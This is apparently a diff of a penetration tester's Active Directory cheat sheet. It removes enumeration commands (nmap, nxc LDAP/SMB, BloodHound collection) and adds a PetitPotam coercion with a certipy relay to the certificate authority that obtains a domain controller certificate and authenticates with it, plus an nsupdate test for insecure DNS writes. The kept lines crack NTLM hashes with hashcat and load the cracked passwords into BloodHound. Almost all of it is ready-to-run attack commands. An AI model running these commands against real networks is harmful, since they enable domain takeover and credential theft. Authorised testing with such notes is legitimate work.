@@ -1,15 +1,3 @@
-# Find domain controller name
-nmap -p 389 -sV 192.168.100.0/24 | grep Host: | cut -d " " -f 4 | sed 's/.$//'
-
-# Get all subnets from sites and services. Perfect for the nmap script.
-nxc ldap <ip> -u <user> -p <pass> -M subnets | grep Subnet: | cut -d '(' -f 2 | cut -d ')' -f 1 | cut -d ':' -f 2
-
-# Password Policy
-nxc smb <ip> -u <user> -p <pass> --pass-pol
-
-# get bloodhound data (set domain and dc in hostfile first)
-nxc ldap <ip> -u <user> -p <pass> --bloodhound -ns <ns-ip> --collection All
-
 # Export in hashcat format (sort of)
 nxcdb creds export hashcat "filename"
 
@@ -23,3 +11,24 @@ sudo hashcat --username -a 0 -m 1000 hashes --show | sed "s/^/DOMAIN.TLD\\\\/" >
 
 # Add shit to Bloodhound
 crackhound.py -f crackhound_input.txt -u neo4j -p toor -plaintext -addpw
+
+# PetitPotam
+Get PetitPotam from "topotam" (github)
+pip3 install certipy-ad
+
+python3 PetitPotam.py -u <user> -p <pass> -d <DOMAIN> -dc-ip <DCIP> <KALIIP> <DCIP>
+
+certipy-ad relay -target "http://CA.doman.tld" -template DomainController
+certipy-ad auth -pfx "PFXFILE" -dc-ip <DCIP>
+
+# Insecure DNS
+nsupdate
+server <DNS-Server>
+update add pt.<FQDN> 5 TXT "Hello World"
+send
+quit
+
+nslookup
+server <DNS-Server>
+set type=txt
+pt.<FQDN>
